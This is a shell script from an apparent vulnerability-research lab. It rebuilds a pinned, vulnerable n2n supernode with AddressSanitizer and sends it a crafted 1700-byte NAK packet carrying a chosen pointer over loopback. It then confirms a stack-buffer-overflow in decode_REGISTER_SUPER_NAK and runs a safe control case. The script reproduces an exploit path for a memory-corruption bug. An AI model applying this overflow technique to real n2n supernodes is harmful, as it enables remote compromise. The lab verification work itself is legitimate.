#!/bin/sh
# W21 one-command replay: the exact W11 wire (token_size=1700) against a
# live loopback supernode built with AddressSanitizer. Closes W20's ASan
# UNKNOWN. The chosen 0x42f3e8 pointer is on the wire at token+1682 exactly
# as in W11; ASan is expected to fault the 1700-byte decode write before
# any dereference of the overwritten comm spill slot.
#
#   sh lab/frontier/n2n2shell/live/w21_asan_wire1700.sh
#
# Prints "RESULT <n> PASS / <m> FAIL"; rc 0 only when m=0. Loopback only.
set -u
HERE=$(cd "$(dirname "$0")" || exit 1; pwd)
N2N=$(cd "$HERE/.." || exit 1; pwd)
TARBALL=$N2N/provision/n2n-vuln.tar.gz
SENDER=$HERE/w10_large_peer.py
EVID=${REPLAY_LOGDIR:-$HERE/evidence}
WORK=${TMPDIR:-/tmp}/n2n2shell-w21.$$
BASE=${PORT_BASE:-19600}
PASS=0
FAIL=0
mkdir -p "$WORK/src" "$EVID" || exit 1
trap 'rm -rf "$WORK"' EXIT HUP INT TERM
check() {
    if [ "$2" -eq 0 ]; then PASS=$((PASS+1)); echo "PASS $1";
    else FAIL=$((FAIL+1)); echo "FAIL $1"; fi
}

(cd "$N2N" && sha256sum -c pins.sha256) >"$EVID/w21-pins.log" 2>&1
check 01-pins-exact "$?"

tar xzf "$TARBALL" -C "$WORK/src" || exit 1
SRC=$WORK/src/n2n-dc7324af16b2ff3e2b22961e7d8dffcb14f3f6ff
(cd "$SRC" && sh autogen.sh &&
    CC=clang CFLAGS="-fsanitize=address -fno-omit-frame-pointer -g -O1" \
    LDFLAGS="-fsanitize=address" ./configure &&
    make -j4 supernode) >"$EVID/w21-asan-build.log" 2>&1
check 02-asan-build "$?"
[ -x "$SRC/supernode" ] || { echo "RESULT $PASS PASS / $FAIL FAIL"; exit 1; }
nm -an "$SRC/supernode" 2>/dev/null | grep -q '__asan_report'
check 03-asan-instrumented-binary "$?"

# run_case <label> <port> <token_size> <override...>; leaves SN_RC and logs.
run_case() {
    label=$1; port=$2; size=$3; shift 3
    (cd "$SRC" && timeout 60 ./supernode -f -p 127.0.0.1:$port \
        -t $((port+1)) -c community.list -F labfed -M) \
        >"$EVID/w21-asan-$label.log" 2>&1 &
    sp=$!
    sleep 2
    python3 "$SENDER" "$port" "$((port+10))" "$size" "$@" \
        >"$EVID/w21-$label-sender.log" 2>&1
    i=0
    while kill -0 "$sp" 2>/dev/null && [ "$i" -lt 20 ]; do
        sleep 0.5
        i=$((i+1))
    done
    if kill -0 "$sp" 2>/dev/null; then kill "$sp" 2>/dev/null || true; fi
    wait "$sp" 2>/dev/null
    SN_RC=$?
}

# A: the W11 wire, no debugger, chosen fixed pointer carried on the wire.
run_case attack "$BASE" 1700 "1682:0x42f3e8"
grep -q 'sent NAK len=1738 token_size=1700' "$EVID/w21-attack-sender.log"
check 04-attack-wire-sent "$?"
grep -q 'override token+1682 = e8f3420000000000' "$EVID/w21-attack-sender.log"
check 05-chosen-pointer-on-wire "$?"
grep -q 'ERROR: AddressSanitizer: stack-buffer-overflow' "$EVID/w21-asan-attack.log"
check 06-asan-stack-overflow "$?"
grep -q 'WRITE of size 1700' "$EVID/w21-asan-attack.log"
check 07-asan-write-1700 "$?"
grep -q 'wire.c:179' "$EVID/w21-asan-attack.log"
check 08-asan-write-site "$?"
grep -q 'decode_buf' "$EVID/w21-asan-attack.log" &&
    grep -q 'decode_REGISTER_SUPER_NAK' "$EVID/w21-asan-attack.log" &&
    grep -q 'process_udp' "$EVID/w21-asan-attack.log"
check 09-asan-three-frames "$?"
[ "$SN_RC" -ne 0 ]
check 10-asan-process-aborted "$?"
if grep -q 'SEGV on unknown address' "$EVID/w21-asan-attack.log"; then RC=1;
else RC=0; fi
check 11-no-deref-segv "$?"

# B: safe 48-byte wire on a fresh process of the same ASan build.
run_case safe "$((BASE+60))" 48
grep -q 'sent NAK len=86 token_size=48' "$EVID/w21-safe-sender.log"
check 12-safe-wire-sent "$?"
grep -q 'first=485a4d49485a4d49' "$EVID/w21-safe-sender.log"
check 13-safe-token-bytes "$?"
if grep -q 'ERROR: AddressSanitizer' "$EVID/w21-asan-safe.log"; then RC=1;
else RC=0; fi
check 14-safe-no-asan-report "$?"

echo "RESULT $PASS PASS / $FAIL FAIL"
echo "RAW $EVID/w21-*.log"
[ "$FAIL" -eq 0 ]
